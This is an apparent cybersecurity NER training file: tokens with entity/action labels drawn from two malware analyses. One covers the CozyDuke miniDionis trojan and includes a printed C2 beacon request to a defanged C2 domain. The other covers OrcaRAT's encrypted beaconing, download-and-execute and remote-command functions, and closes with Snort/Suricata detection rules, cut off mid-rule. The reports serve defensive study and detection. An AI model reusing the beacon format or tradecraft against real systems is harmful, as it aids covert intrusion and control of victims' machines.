this	O
file	O
is	O
roughly	O
16	O
kb	O
,	O
leaving	O
approximately	O
200	O
kb	O
of	O
the	O
file	O
unaccounted	O
for	O
.	O
The	O
second	O
stage	O
dropper	O
contains	O
decoding	O
routines	O
that	O
decode	O
the	O
arbitrary	O
binary	O
data	O
into	O
an	O
executable	O
file	O
.	O
The	O
executable	O
file	O
is	O
dropped	O
in	O
%	O
appdata%/Roaming	O
and	O
appears	O
to	O
try	O
and	O
emulate	O
legitimate	O
software	O
names	O
:	O
TimbuktuDaemon	O
,	O
SearchIndexer	O
,	O
RtkAudioService64	O
,	O
dirmngr	O
,	O
o2flash	O
,	O
and	O
usbrefs64	O
.	O
This	O
file	O
was	O
not	O
observed	O
on	O
VirusTotal	O
until	O
July	O
9	O
and	O
has	O
extremely	O
low	O
detection	O
rates	O
[	O
VT	O
:	O
3/54	O
]	O
.	O
It	O
appears	O
that	O
the	O
authors	O
of	O
this	O
particular	O
iteration	O
of	O
the	O
CozyCar	O
group	O
's	O
malware	O
internally	O
call	O
it	O
"	O
miniDionis	O
"	O
according	O
to	O
pdb	O
strings	O
left	O
in	O
the	O
binary	O
(	O
c:\BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb	O
)	O
.	O
It	O
also	O
appears	O
to	O
be	O
an	O
iteration	O
on	O
the	O
"	O
forkmeimfamous	O
"	O
aka	O
Seaduke	O
malware	O
analyzed	O
by	O
Unit	O
42	O
in	O
a	O
previous	O
blog	O
[	O
4	O
]	O
.	O
The	O
malware	O
stores	O
2	O
files	O
in	O
the	O
%	O
temp%	O
directory	O
:	O
a	O
configuration	O
file	O
and	O
a	O
secondary	O
dll	O
.	O
The	O
configuration	O
file	O
's	O
name	O
matches	O
the	O
final	O
characters	O
of	O
the	O
bot_id	O
that	O
is	O
contained	O
within	O
as	O
per	O
the	O
sample	O
below	O
.	O
Analysis	O
of	O
the	B-Entity
secondary	I-Entity
dll	I-Entity
file	I-Entity
(	O
name	O
matches	O
[	O
A	O
-	O
Z0	O
-	O
9]{1}\.tmp	O
)	O
indicates	O
that	O
its	O
primary	O
function	O
is	O
to	O
serve	B-Action
as	O
a	O
cleanup	B-Entity
mechanism	I-Entity
for	I-Entity
the	I-Entity
dropped	I-Entity
binary	I-Entity
.	O
This	O
is	O
likely	O
an	O
attempt	O
to	O
thwart	O
forensic	O
investigations	O
.	O
Further	O
examination	O
of	O
memory	O
dumps	O
taken	O
following	O
the	O
execution	O
of	O
miniDionis	O
reveals	O
some	O
clues	O
into	O
the	O
beaconing	O
activity	O
exhibited	O
.	O
The	O
malware	O
stores	O
configuration	O
values	O
in	O
memory	O
as	O
key	O
:	O
value	O
pairs	O
.	O
The	O
configuration	O
of	O
miniDionis	O
is	O
a	O
JSON	O
blob	O
with	O
several	O
important	O
sections	O
,	O
which	O
are	O
described	O
in	O
the	O
table	O
below	O
.	O
The	O
functional	O
payload	O
of	O
this	O
Trojan	O
starts	O
by	O
creating	O
a	O
Mutex	O
by	O
splitting	O
the	O
"	O
bot_id	O
"	O
value	O
in	O
the	O
configuration	O
on	O
the	O
hyphen	O
(	O
"	O
-	O
"	O
)	O
and	O
using	O
the	O
second	O
portion	O
of	O
the	O
split	O
string	O
(	O
specifically	O
,	O
"	O
01MRLXW	O
"	O
in	O
the	O
case	O
of	O
this	O
configuration	O
)	O
.	O
From	O
a	O
functionality	O
standpoint	O
,	O
the	O
Trojan	O
uses	O
the	O
concept	O
of	O
tasks	O
that	O
are	O
processed	O
and	O
completed	O
using	O
a	O
pool	O
of	O
threads	O
.	O
To	O
obtain	O
tasks	O
,	O
the	B-Entity
Trojan	I-Entity
will	O
issue	O
an	O
HTTPS	B-Entity
request	I-Entity
to	B-Modifier
the	O
C2	B-Entity
server	I-Entity
(	O
"	O
host_scripts	O
"	O
in	O
the	O
configuration	O
)	O
that	O
resembles	O
the	O
following	O
example	O
beacon	O
.	O
GET	B-Entity
/mobile	O
/	O
viewer.php	O
HTTP/1.1	O
Accept	O
:	O
*	O
/	O
*	O
Accept	O
-	O
Language	O
:	O
en	O
-	O
US	O
User	O
-	O
Agent	O
:	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.1	O
;	O
WOW64	O
;	O
Trident/7.0	O
;	O
rv:11.0	O
)	O
like	O
Gecko	O
Host	O
:	O
www.illuminatistudios[.]net	O
Cookie	O
:	O
SSID	O
=	O
sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8	O
-	O
25A	O
Accept	O
-	O
Encoding	O
:	O
gzip	O
,	O
deflate	O
Connection	O
:	O
Keep	O
-	O
Alive	O
GET	O
/mobile	O
/	O
viewer.php	O
HTTP/1.1	O
Accept	O
:	O
*	O
/	O
*	O
Accept	O
-	O
Language	O
:	O
en	O
-	O
US	O
User	O
-	O
Agent	O
:	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.1	O
;	O
WOW64	O
;	O
Trident/7.0	O
;	O
rv:11.0	O
)	O
like	O
Gecko	O
Host	O
:	O
www.illuminatistudios[.]net	O
Cookie	O
:	O
SSID	O
=	O
sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8	O
-	O
25A	O
Accept	O
-	O
Encoding	O
:	O
gzip	O
,	O
deflate	O
Connection	O
:	O
Keep	O
-	O
Alive	O
The	O
Trojan	O
manually	O
creates	O
the	O
cookie	O
in	O
this	O
HTTP	O
request	O
.	O
The	O
cookie	O
contains	O
ciphertext	O
that	O
the	O
Trojan	O
creates	O
based	O
on	O
the	O
"	O
bot_id	O
"	O
in	O
the	O
JSON	O
configuration	O
.	O
The	O
Trojan	O
compresses	O
the	O
"	O
bot_id	O
"	O
string	O
using	O
zlib	O
and	O
then	O
encrypts	O
it	O
using	O
the	O
RC4	O
algorithm	O
using	O
a	O
generated	O
key	O
.	O
The	O
generated	O
key	O
is	O
a	O
SHA1	O
hash	O
of	O
two	O
randomly	O
created	B-Action
strings	O
:	O
the	O
first	O
of	O
which	O
is	O
between	O
2	O
and	O
8	O
bytes	O
long	O
and	O
the	O
second	O
is	O
between	O
1	O
and	O
7	O
characters	O
in	O
length	O
.	O
The	O
ciphertext	O
of	O
the	O
"	O
bot_id	O
"	O
is	O
then	O
based64	O
encoded	O
and	O
finally	O
the	O
appended	O
to	O
the	O
"	O
cookie_name	O
"	O
(	O
"	O
SSID=	O
"	O
)	O
in	O
the	O
configuration	O
and	O
sent	O
within	O
the	O
HTTP	O
request	O
to	O
the	O
C2	O
server	O
.	O
Unit	O
42	O
did	O
not	O
observe	O
the	O
first	O
random	O
string	O
(	O
between	O
2	O
and	O
8	O
characters	O
in	O
length	O
)	O
sent	O
to	O
the	O
C2	O
in	O
the	O
first	O
beacon	O
,	O
which	O
would	O
be	O
required	O
by	O
the	O
C2	O
to	O
reproduce	O
the	O
exact	O
SHA1	O
hash	O
used	O
as	O
a	O
key	O
to	O
generate	O
the	O
ciphertext	O
in	O
the	O
cookie	O
.	O
Upon	O
further	O
examination	O
we	O
believe	O
that	O
the	O
C2	O
will	O
not	O
be	O
able	O
to	O
decrypt	O
the	O
cookie	O
in	O
the	O
first	O
beacon	O
.	O
Instead	O
,	O
the	O
C2	O
will	O
respond	O
to	O
the	O
first	O
beacon	O
with	O
data	O
that	O
the	O
Trojan	O
will	O
use	O
to	O
extract	O
a	O
string	O
,	O
using	O
a	O
function	O
named	O
TrExtractKey	O
seen	O
in	O
Figure	O
2	O
,	O
to	O
replace	O
the	O
first	O
random	O
string	O
used	O
to	O
generate	O
the	O
SHA1	O
hash	O
.	O
Once	O
the	O
C2	O
and	O
Trojan	O
have	O
synchronized	O
using	O
this	O
string	O
,	O
the	O
C2	O
will	O
be	O
able	O
to	O
decrypt	O
subsequent	O
network	O
beacons	O
because	O
the	O
Trojan	O
includes	O
the	O
random	O
string	O
between	O
1	O
and	O
7	O
characters	O
that	O
makes	O
up	O
the	O
second	O
half	O
of	O
the	O
SHA1	O
hash	O
within	O
the	O
cookie	O
field	O
before	O
the	O
ciphertext	O
.	O
The	O
C2	O
communications	O
,	O
and	O
several	O
of	O
the	O
commands	O
we	O
will	O
discuss	O
in	O
this	O
blog	O
,	O
include	O
a	O
rather	O
interesting	O
technique	O
to	O
manually	O
handle	O
HTTP	O
redirection	O
,	O
such	O
as	O
the	O
HTTP	O
301	O
Moved	O
Permanently	O
and	O
HTTP	O
302	O
Found	O
status	O
codes	O
.	O
The	O
technique	O
used	O
to	O
handle	O
these	O
redirections	O
involves	O
checking	O
for	O
the	O
presence	O
of	O
a	O
"	O
Location	O
"	O
field	O
within	O
the	O
HTTP	O
headers	O
of	O
the	O
server	O
response	O
,	O
then	O
using	O
regular	O
expressions	O
to	O
parse	O
the	O
HTML	O
within	O
server	O
response	O
to	O
find	O
the	O
appropriate	O
URL	O
.	O
The	O
code	O
contains	O
three	O
regular	O
expressions	O
to	O
parse	O
the	O
HTML	O
to	O
locate	O
the	O
URL	O
,	O
the	O
first	O
of	O
which	O
is	O
"	O
<	O
a.*?>.*?</a	O
>	O
"	O
that	O
locates	O
all	O
of	O
the	O
tags	O
associated	O
with	O
link	O
within	O
the	O
HTML	O
.	O
The	O
second	O
regular	O
expression	O
of	O
"	O
onclick=\"Accept();\	O
"	O
"	O
locates	O
only	O
links	O
within	O
the	O
HTML	O
with	O
a	O
specific	O
"	O
onclick	O
"	O
action	O
.	O
The	O
last	O
regular	O
expression	O
of	O
"	O
href\\s*=\\s*(?:[\"'](?<1>[^\"']*)[\"']|(?<1>\\S+	O
)	O
)	O
"	O
to	O
obtain	O
the	O
correct	O
URL	O
to	O
interact	O
with	O
as	O
the	O
C2	O
server	O
.	O
Once	O
the	O
C2	O
and	O
Trojan	O
have	O
synchronized	O
and	O
can	O
decrypt	O
their	O
network	O
communications	O
the	B-Entity
C2	I-Entity
server	I-Entity
will	O
begin	O
responding	O
to	O
beacons	B-Action
from	B-Entity
the	I-Entity
Trojan	I-Entity
with	O
JSON	O
blobs	O
.	O
Unit	O
42	O
has	O
not	O
received	O
any	O
JSON	O
blobs	O
from	O
an	O
active	O
C2	O
server	O
,	O
but	O
based	O
on	O
static	O
analysis	O
of	O
the	O
Trojan	O
determined	O
the	O
JSON	O
would	O
look	O
as	O
follows	O
.	O
{	O
'	O
tasks	O
'	O
:	O
[	O
{	O
'	O
task_id	O
'	O
:	O
"	O
"	O
,	O
'	O
task_data	O
'	O
:	O
{	O
'	O
command	O
'	O
:	O
"	O
"	O
,	O
'	O
data	O
'	O
:	O
"	O
"	O
}	O
}	O
,	O
]	O
}	O
{	O
'	O
tasks	O
'	O
:	O
[	O
{	O
'	O
task_id	O
'	O
:	O
"	O
"	O
,	O
'	O
task_data	O
'	O
:	O
{	O
'	O
command	O
'	O
:	O
"	O
"	O
,	O
'	O
data	O
'	O
:	O
"	O
"	O
}	O
}	O
,	O
]	O
}	O
The	O
Trojan	O
takes	O
this	O
JSON	O
blob	O
and	O
adds	O
each	O
task	O
in	O
the	O
list	O
into	O
a	O
pool	O
for	O
processing	O
.	O
Separate	O
worker	O
threads	O
access	O
this	O
pool	O
of	O
tasks	O
and	O
process	O
the	O
commands	O
and	O
perform	O
the	O
necessary	O
activities	O
.	O
Unit	O
42	O
analyzed	O
the	O
Trojan	O
's	O
command	O
handler	O
and	O
found	O
several	O
commands	O
,	O
as	O
seen	O
in	O
Table	O
2	O
,	O
which	O
allows	O
the	O
threat	B-Entity
actors	I-Entity
to	B-Modifier
carry	I-Modifier
out	B-Entity
a	I-Entity
full	I-Entity
range	I-Entity
of	I-Entity
activities	I-Entity
on	I-Entity
the	I-Entity
system	I-Entity
.	O
The	O
actors	O
behind	O
the	O
CozyDuke	O
framework	O
are	O
highly	O
sophisticated	O
,	O
motivated	O
,	O
and	O
have	O
become	O
increasingly	O
bold	O
in	O
their	O
campaigns	O
.	O
We	O
recommend	O
that	O
other	O
security	O
practitioners	O
review	O
the	O
included	O
Indicators	O
of	O
Compromise	O
(	O
IoCs	O
)	O
to	O
ensure	O
they	O
have	O
not	O
been	O
targets	O
in	O
this	O
campaign	O
,	O
and	O
add	O
the	O
appropriate	O
security	O
controls	O
to	O
prevent	O
future	O
attacks	O
.	O
This	O
group	O
is	O
reliant	O
on	O
social	O
engineering	O
,	O
and	O
thus	O
,	O
user	O
education	O
remains	O
of	O
paramount	O
importance	O
.	O
Palo	O
Alto	O
Networks	O
customers	O
using	O
WildFire	O
were	O
protected	O
from	O
this	O
campaign	O
.	O
All	O
known	O
elements	O
of	O
this	O
campaign	O
have	O
been	O
accurately	O
identified	O
by	O
WildFire	O
as	O
malicious	O
.	O
By	O
Dan	O
Kelly	O
and	O
Tom	O
Lancaster	O
It	O
's	O
every	O
malware	O
analyst	O
's	O
dream	O
to	O
be	O
handed	O
a	O
sample	O
which	O
is	O
,	O
so	O
far	O
,	O
unnamed	O
by	O
the	O
AV	O
community	O
-	O
especially	O
when	O
the	O
malware	O
in	O
question	O
may	O
have	O
links	O
to	O
a	O
well	O
-	O
known	O
APT	O
group	O
.	O
In	O
my	O
line	O
of	O
work	O
I	O
analyse	O
several	O
'	O
unknown	O
'	O
malware	O
samples	O
a	O
week	O
,	O
but	O
often	O
it	O
turns	O
out	O
that	O
they	O
are	O
simply	O
new	O
variants	O
of	O
existing	O
malware	O
families	O
.	O
Recently	O
I	O
was	O
fortunate	O
enough	O
to	O
be	O
handed	O
something	O
that	O
not	O
only	O
had	O
a	O
low	O
detection	O
rate	O
but	O
,	O
aside	O
from	O
heuristics	O
,	O
seemed	O
to	O
be	O
relatively	O
unknown	O
to	O
the	O
top	O
40	O
anti	O
-	O
virus	O
companies	O
.	O
In	O
this	O
post	O
I	O
will	O
walk	O
you	O
through	O
the	O
malware	O
family	O
we	O
've	O
dubbed	O
"	O
OrcaRAT	O
"	O
.	O
First	O
of	O
all	O
,	O
it	O
is	O
worth	O
pointing	O
out	O
that	O
most	O
of	O
the	O
malware	O
I	O
see	O
on	O
a	O
day	O
-	O
to	O
-	O
day	O
basis	O
is	O
espionage	O
orientated	O
,	O
and	O
very	O
rarely	O
do	O
the	O
programmers	O
and	O
operators	O
make	O
much	O
effort	O
to	O
cover	O
their	O
tracks	O
.	O
The	O
use	O
of	O
forged	O
HTTP	O
headers	O
is	O
a	O
common	O
occurrence	O
and	O
simple	O
mistakes	O
within	O
these	O
headers	O
are	O
frequent	O
.	O
The	O
malware	O
in	O
question	O
was	O
handed	O
to	O
me	O
by	O
one	O
of	O
our	O
threat	O
intelligence	O
analysts	O
who	O
was	O
hunting	O
through	O
infrastructure	O
associated	O
with	O
some	O
samples	O
of	O
Comfoo[1	O
]	O
malware	O
and	O
happened	O
across	O
a	O
malware	O
sample	O
(	O
253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613	O
)	O
he	O
did	O
n't	O
recognise	O
.	O
He	O
immediately	O
took	O
the	O
malware	O
and	O
passed	O
it	O
through	O
first	O
stage	O
analysis	O
,	O
which	O
involves	O
running	O
the	O
file	O
in	O
a	O
sandbox	O
environment	O
.	O
After	O
this	O
,	O
he	O
handed	O
it	O
over	O
for	O
more	O
in	O
-	O
depth	O
capability	O
analysis	O
.	O
The	O
structure	O
I	O
began	O
by	O
looking	O
over	O
the	O
sandbox	O
report	O
.	O
The	O
first	O
thing	O
that	O
drew	O
my	O
attention	O
was	O
the	O
URI	O
structure	O
.	O
(	O
A	O
screenshot	O
showing	O
the	O
HTTP	O
headers	O
and	O
URI	O
structure	O
that	O
OrcaRAT	O
produces	O
)	O
To	O
those	O
of	O
us	O
who	O
are	O
familiar	O
with	O
decoding	O
data	O
,	O
you	O
will	O
notice	O
that	O
the	O
URI	O
string	O
formatting	O
appears	O
to	O
be	O
a	O
modified	O
version	O
of	O
the	O
Base64	O
algorithm	O
.	O
To	O
understand	O
this	O
structure	O
more	O
,	O
we	O
must	O
reverse	O
engineer	O
the	O
functions	O
that	O
generate	O
and	O
then	O
encode	O
the	O
data	O
.	O
Firstly	O
we	O
begin	O
by	O
analysing	O
the	O
routines	O
that	O
produce	O
the	O
data	O
which	O
is	O
later	O
encoded	O
and	O
sent	O
in	O
the	O
HTTP	O
URI	O
field	O
.	O
The	O
very	O
first	O
thing	O
that	O
jumped	O
out	O
when	O
disassembling	O
the	O
malware	O
is	O
the	O
simplicity	O
and	O
cleanliness	O
of	O
the	O
code	O
.	O
There	O
are	O
also	O
a	O
significant	O
number	O
of	O
Windows	O
Crypto	O
API[2	O
]	O
functions	O
imported	O
by	O
the	O
malware	O
,	O
so	O
we	O
can	O
assume	O
this	O
indicates	O
that	O
it	O
uses	O
encryption	O
.	O
(	O
A	O
screenshot	O
showing	O
the	O
functions	O
that	O
are	O
imported	O
by	O
OrcaRAT	O
)	O
Delving	O
deeper	O
in	O
to	O
the	O
disassembly	O
,	O
we	O
come	O
across	O
the	O
preamble	O
to	O
the	O
URI	O
generation	O
function	O
.	O
(	O
A	O
screenshot	O
showing	O
the	O
decoding	O
and	O
generation	O
of	O
a	O
string	O
value	O
)	O
The	O
function	O
above	O
uses	O
Windows	O
crypto	O
API	O
to	O
generate	O
a	O
random	O
number	O
of	O
6	O
bytes	O
,	O
then	O
dynamically	O
builds	O
and	O
appends	O
the	O
word	O
"	O
OrcaKiller	O
"	O
on	O
to	O
the	O
end	O
of	O
this	O
number	O
.	O
In	O
one	O
such	O
example	O
the	O
final	O
product	O
was	O
"	O
\x61\xBA\xF4\x44\x52\xF1OrcaKiller	O
"	O
(	O
where	O
\x	O
denotes	O
hexadecimal	O
values	O
)	O
.	O
Once	O
this	O
value	O
has	O
been	O
produced	O
,	O
the	O
malware	O
begins	O
constructing	O
the	O
URI	O
.	O
With	O
many	O
pieces	O
of	O
malware	O
the	B-Entity
initial	I-Entity
communications	I-Entity
that	O
it	O
sends	B-Action
out	I-Action
to	B-Modifier
its	B-Entity
command	I-Entity
and	I-Entity
control	I-Entity
server	I-Entity
(	O
known	O
as	O
beaconing	O
or	O
phoning	O
home	O
)	O
usually	O
include	O
pieces	O
of	O
information	O
about	O
the	O
victim	O
system	O
.	O
OrcaRAT	O
is	O
no	O
exception	O
.	O
The	O
randomly	O
generated	O
values	O
noted	O
above	O
are	O
actually	O
used	O
to	O
encrypt	O
several	O
pieces	B-Entity
of	I-Entity
information	I-Entity
that	I-Entity
are	I-Entity
extracted	I-Entity
from	I-Entity
the	I-Entity
system	I-Entity
,	O
and	O
even	O
the	O
key	O
itself	O
is	O
included	O
.	O
(	O
A	O
screenshot	O
showing	O
an	O
encryption	O
function	O
used	O
by	O
OrcaRAT	O
)	O
All	O
of	O
the	O
values	O
extracted	O
from	O
the	O
system	O
are	O
encrypted	O
using	O
the	O
RC4[3	O
]	O
algorithm	O
and	O
then	O
base64	O
encoded	O
.	O
The	O
RC4	O
encryption	O
key	O
is	O
derived	O
from	O
an	O
MD5	O
hash[4	O
]	O
of	O
the	O
randomly	O
generated	O
bytes	O
concatenated	O
with	O
the	O
'	O
OrcaKiller	O
'	O
string	O
.	O
Once	O
the	O
data	O
has	O
been	O
encrypted	O
it	O
is	O
base64	O
encoded	O
.	O
Any	O
forward	O
slashes	O
in	O
the	O
base64	O
string	O
are	O
replaced	O
with	O
a	O
tilde	O
-	O
pseudo	O
code	O
is	O
shown	O
below	O
.	O
Once	O
all	O
of	O
the	O
values	O
have	O
been	O
encrypted	O
and	O
formatted	O
the	O
URI	O
has	O
the	O
following	O
structure	O
.	O
(	O
A	O
screenshot	O
showing	O
the	O
URI	O
structure	O
of	O
OrcaRAT	O
command	O
and	O
control	O
activity	O
)	O
The	O
campaign	O
ID	O
value	O
is	O
constructed	O
using	O
a	O
method	O
similar	O
to	O
that	O
for	O
the	O
encryption	O
key	O
.	O
(	O
A	O
screenshot	O
showing	O
the	O
generation	O
of	O
the	O
first	O
hidden	O
string	O
value	O
)	O
It	O
would	O
appear	O
that	O
the	O
authors	O
did	O
not	O
want	O
anybody	O
to	O
be	O
able	O
to	O
easily	O
see	O
this	O
value	O
.	O
This	O
now	O
gives	O
us	O
OrcaKiller	O
and	O
wHaLe	O
.	O
It	O
would	O
appear	O
that	O
our	O
adversary	O
has	O
a	O
salty	O
sense	O
of	O
humour	O
.	O
Command	O
and	O
control	O
As	O
with	O
all	O
malware	O
,	O
the	O
command	O
and	O
control	O
functions	O
reveal	O
the	O
true	O
nature	O
and	O
intent	O
of	O
the	O
operators	O
.	O
Up	O
until	O
now	O
we	O
have	O
only	O
determined	O
how	O
the	O
malware	O
communicates	O
with	O
the	O
server	O
.	O
We	O
will	O
now	O
investigate	O
the	O
mechanisms	O
that	O
the	O
server	O
uses	O
to	O
communicate	O
and	O
interact	O
with	O
the	O
victim	O
.	O
The	O
command	O
and	O
control	O
routine	O
in	O
OrcaRAT	O
appears	O
to	O
serve	O
two	O
purposes	O
.	O
Interestingly	O
these	O
routines	O
are	O
split	O
in	O
to	O
two	O
branches	O
.	O
Each	O
branch	O
of	O
command	O
and	O
control	O
activity	O
is	O
determined	O
by	O
the	O
unique	O
response	O
from	O
the	O
remote	O
server	O
.	O
Command	O
and	O
control	O
takes	O
form	O
of	O
a	O
webpage	O
.	O
Unlike	O
malware	O
designed	O
by	O
the	O
well	O
-	O
known	O
Comment	O
Crew[5	O
]	O
,	O
this	O
group	O
does	O
not	O
hide	O
these	O
commands	O
in	O
HTML	O
comments	O
,	O
but	O
instead	O
places	O
them	O
in	O
plain	O
view	O
.	O
The	O
first	B-Entity
set	I-Entity
of	I-Entity
commands	I-Entity
force	I-Entity
the	O
malware	O
to	O
behave	B-Action
as	B-Entity
a	I-Entity
simple	I-Entity
downloader	I-Entity
.	O
(	O
A	O
screenshot	O
showing	O
OrcaRAT	O
parsing	O
the	O
HTML	O
code	O
behind	O
a	O
webpage	O
)	O
Upon	O
downloading	O
the	O
webpage	O
from	O
the	O
server	O
the	O
malware	O
looks	O
for	O
specific	O
sets	O
of	O
HTML	O
tags	O
.	O
The	O
first	O
set	O
are	O
<	O
P	O
>	O
and	O
the	O
terminating	O
tag	O
<	O
/P>.	O
Once	O
the	O
malware	O
has	O
found	O
these	O
tags	O
it	O
drops	O
in	O
to	O
the	O
first	O
command	O
and	O
control	O
function	O
.	O
The	O
malware	O
then	O
extracts	O
the	O
payload	O
text	O
between	O
the	O
HTML	O
tags	O
and	O
runs	O
it	O
through	O
a	O
decryption	O
routine	O
.	O
The	O
same	O
encryption	O
key	O
that	O
is	O
sent	O
in	O
the	O
URI	O
string	O
is	O
used	O
to	O
decrypt	O
the	O
text	O
.	O
Once	O
the	O
payload	O
text	O
has	O
been	O
decrypted	O
the	O
malware	O
treats	O
this	O
as	O
a	B-Entity
binary	I-Entity
executable	I-Entity
file	I-Entity
,	O
which	O
is	O
then	O
written	B-Action
to	B-Modifier
the	O
disk	O
and	O
executed	O
.	O
The	O
second	O
set	O
of	O
HTML	O
tags	O
allows	O
the	O
operator	O
to	O
drop	O
the	O
malware	O
in	O
to	O
a	O
set	O
of	O
remote	O
control	O
functions	O
.	O
This	O
time	O
the	O
malware	O
searches	O
for	O
the	O
<	O
H1	O
>	O
tag	O
that	O
is	O
terminated	O
by	O
<	O
/H1>.	O
Once	O
the	O
payload	O
text	O
between	O
these	O
tags	O
has	O
been	O
extracted	O
it	O
is	O
then	O
decrypted	O
using	O
the	O
encryption	O
key	O
found	O
in	O
the	O
URI	O
string	O
.	O
The	O
payload	O
text	O
from	O
this	O
page	O
is	O
much	O
smaller	O
and	O
ultimately	O
points	O
to	O
the	O
command	O
function	O
that	O
the	O
operator	O
has	O
executed	O
.	O
(	O
A	O
screenshot	O
showing	O
the	O
structure	O
of	O
the	O
command	O
and	O
control	O
routines	O
within	O
OrcaRAT	O
)	O
The	B-Entity
command	I-Entity
and	I-Entity
control	I-Entity
structure	I-Entity
is	O
fairly	O
simplistic	O
but	O
provides	O
the	O
operator	O
with	O
access	B-Action
to	B-Entity
the	I-Entity
victim	I-Entity
machine	I-Entity
's	I-Entity
filesystem	I-Entity
and	I-Entity
command	I-Entity
line	I-Entity
,	O
and	O
as	O
such	O
allows	O
the	O
attacker	O
to	O
perform	O
various	O
tasks	O
such	O
as	O
executing	O
arbitrary	O
commands	O
or	O
uploading	B-Action
and	O
downloading	B-Action
files	B-Entity
from	I-Entity
the	O
compromised	B-Entity
system	I-Entity
.	O
After	O
a	O
command	O
and	O
control	O
message	O
is	O
received	O
,	O
OrcaRAT	O
sends	O
an	O
HTTP	B-Entity
POST	I-Entity
message	I-Entity
back	B-Action
to	O
the	O
command	B-Entity
and	I-Entity
control	I-Entity
server	I-Entity
.	O
Each	O
time	O
that	O
the	O
URI	O
is	O
built	O
it	O
generates	O
a	O
new	O
encryption	O
key	O
,	O
showing	O
that	O
the	O
command	O
and	O
control	O
server	O
is	O
at	O
least	O
serving	O
dynamic	O
content	O
.	O
Given	O
the	O
command	O
structure	O
above	O
,	O
it	O
is	O
logical	O
to	O
assume	O
that	O
the	O
command	O
and	O
control	O
server	O
requires	O
an	O
operator	O
to	O
manually	O
issue	O
specific	O
commands	O
to	O
the	O
victim	O
workstation	O
,	O
with	O
the	O
default	O
command	O
likely	O
being	O
'	O
sleep	O
'	O
.	O
Given	O
the	O
information	O
above	O
we	O
can	O
reasonably	O
assume	O
that	O
this	B-Entity
malware	I-Entity
was	O
most	O
likely	O
designed	O
as	O
a	O
first	B-Entity
stage	I-Entity
implant	I-Entity
.	O
History	O
has	O
shown	O
that	O
malware	O
designed	O
in	O
this	O
way	O
is	O
usually	O
done	O
so	O
to	O
allow	O
the	O
operator	O
an	O
initial	O
level	O
of	O
access	O
to	O
the	O
compromised	O
system	O
,	O
usually	O
for	O
surveying	O
the	O
victim	O
and	O
then	O
deciding	O
whether	O
to	O
deploy	O
a	O
more	O
capable	O
and	O
valuable	O
second	O
stage	O
malware	O
implant	O
.	O
Detection	O
Once	O
OrcaRAT	O
has	O
been	O
delivered	O
to	O
a	O
victim	O
system	O
there	O
are	O
a	O
number	O
of	O
ways	O
to	O
detect	O
it	O
.	O
Firstly	O
we	O
will	O
cover	O
disk	O
detection	O
using	O
Yara	O
.	O
The	O
rule	O
below	O
will	O
detect	O
an	O
OrcaRAT	O
binary	O
executable	O
that	O
has	O
been	O
written	O
to	O
a	O
compromised	O
machine	O
's	O
disk	O
.	O
OrcaRAT	O
can	O
also	O
be	O
detected	O
in	O
two	O
separate	O
ways	O
at	O
the	O
network	O
level	O
using	O
a	O
Snort	O
or	O
Suricata	O
IDS	O
rule	O
.	O
Detecting	O
malware	O
at	O
different	O
stages	O
of	O
connectivity	O
can	O
be	O
important	O
.	O
By	O
creating	O
signatures	O
with	O
a	O
nexus	O
to	O
the	O
kill	O
chain[6	O
]	O
we	O
can	O
determine	O
which	O
stage	O
the	O
intrusion	O
has	O
reached	O
.	O
The	O
two	O
signatures	O
below	O
will	O
indicate	O
whether	O
the	O
intrusion	O
has	O
reached	O
the	O
command	O
and	O
control	O
or	O
action	O
-	O
on	O
phases	O
.	O
Snort	O
.	O
alert	O
tcp	O
any	O
any	O
-	O
>	O
any	O
any	O
(	O
msg:"::[PwC	O
CTD	O
]	O
:	O
:	O
-	O
OrcaRAT	O
implant	O
check	O
-	O
in	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_client	O
;	O
urilen	O
:	O
67<>170	O
;	O
content:"User	O
-	O
Agent	O
:	O
Mozilla/4.0	O
(	O
compatible\	O
;	O
MSIE	O
8.0\	O
;	O
Windows	O
NT	O
5.1\	O
;	O
Trident/4.0\	O
;	O
.NET	O
CLR	O
2.0.50727\	O
;	O
.NET	O
CLR	O
3.0.04506.30\	O
;	O
.NET4.0C\	O
;	O
.NET4.0E	O
)	O
"	O
;	O
http_header	O
;	O
content:"GET	O
"	O
;	O
http_method	O
;	O
pcre:"/^\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=	O
]	O
{	O
14,18}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{33,38}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{6,9}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{5,50}\/[A	O
-	O
Za	O
-	O
z0-	O
9+~=]{5,50}$/U	O
"	O
;	O
sid	O
:	O
YOUR_SID	O
;	O
rev:1	O
;	O
)	O
alert	O
tcp	O
any	O
any	O
-	O
>	O
any	O
any	O
(	O
msg:"::[PwC	O
CTD	O
]	O
:	O
:	O
-	O
OrcaRAT	O
implant	O
C2	O
confirmation	O
response	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_client	O
;	O
urilen	O
:	O
67<>170	O
;	O
content:"User	O
-	O
Agent	O
:	O
Mozilla/4.0	O
(	O
compatible\	O
;	O
MSIE	O
8.0\	O
;	O
Windows	O
NT	O
5.1\	O
;	O
Trident/4.0\	O
;	O
.NET	O
CLR	O
2.0.50727\	O
;	O
.NET	O
CLR	O
3.0.04506.30\	O
;	O
.NET4.0C\	O
;	O
.NET4.0E	O
)	O
"	O
;	O
http_header	O
;	O
content:"POST	O
"	O
;	O
http_method	O
;	O
pcre:"/^\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=	O
]	O
{	O
14,18}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{33,38}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{6,9}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{5,50}\/[A	O
-	O
Za	O
-	O
z0-	O
9+~=]{5,50}$/U	O
"	O
;	O
sid	O
:	O
YOUR_SID	O
;	O
rev:1	O
;	O
)	O
Suricata	O
.	O
alert	O
http	O
any	O
any	O
-	O
>	O
any	O
any	O
(	O
msg:"::[PwC	O
CTD	O
]	O
:	O
:	O
-	O
OrcaRAT	O
implant	O
check	O
-	O
in	O
"	O
